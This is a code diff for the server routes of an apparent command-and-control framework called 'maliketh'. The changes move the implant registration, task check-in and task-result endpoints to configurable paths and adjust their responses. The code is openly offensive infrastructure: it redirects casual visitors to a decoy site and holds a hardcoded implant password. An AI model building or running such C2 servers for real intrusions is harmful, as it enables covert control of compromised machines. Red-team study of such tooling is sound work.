@@ -5,8 +5,9 @@ from maliketh.db import db
 import maliketh.crypto.aes
 from maliketh.models import *
 from functools import wraps
+from maliketh.config import ROUTES
 
-c2 = Blueprint('c2', __name__)
+c2 = Blueprint('c2', __name__, url_prefix=ROUTES['c2']['base_path'])
 
 implant_auth_password = "thisshouldbereplaced"
 
@@ -24,7 +25,7 @@ def implant_authenticated(func: Callable):
 def hello_c2():
     return redirect("https://google.com")
 
-@c2.route("/register", methods=["POST"])
+@c2.route(ROUTES["c2"]["register"]["path"], methods=ROUTES["c2"]["register"]["methods"])
 def register():
     # /register
     # Body (form data):
@@ -54,10 +55,10 @@ def register():
     db.session.add(implant)
     db.session.commit()
 
-    return "OK", 200
+    return jsonify({"status": True, "id": implant.implant_id}), 200
 
 
-@c2.route("/task", methods=["GET"])
+@c2.route(ROUTES["c2"]["checkin"]["path"], methods=ROUTES["c2"]["checkin"]["methods"])
 def get_task():
     # Get implant id from request
     implant_id = request.args.get("id")
@@ -80,30 +81,29 @@ def get_task():
         db.session.commit()
         return jsonify(task.toJSON())
     # If task is None, return empty task
-    return jsonify(Task().toJSON())
+    return jsonify({})
 
 
 """
 Get the output of a task and mark it as completed
 """
-@c2.route("/task", methods=["POST"])
-def post_task():
+@c2.route(ROUTES["c2"]["task_results"]["path"], methods=ROUTES["c2"]["task_results"]["methods"])
+def post_task(tid: str):
     # Get implant id from request
     implant_id = request.args.get("id")
-    task_id = request.args.get("tid")
 
-    if implant_id is None or task_id is None:
+    if implant_id is None or tid is None:
         return "Not Found", 404
 
     # Check if implant ID exists, if not, throw 404
     implant = get_implant_by_id(implant_id)
     if implant is None:
-        return "Not Found", 404
+        return "Not Found", 401
 
     implant.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     # Get task from db
-    task = get_task_by_id(task_id)
+    task = get_task_by_id(tid)
     # If task is not None, return task
     if task is not None:
         # Get output from request
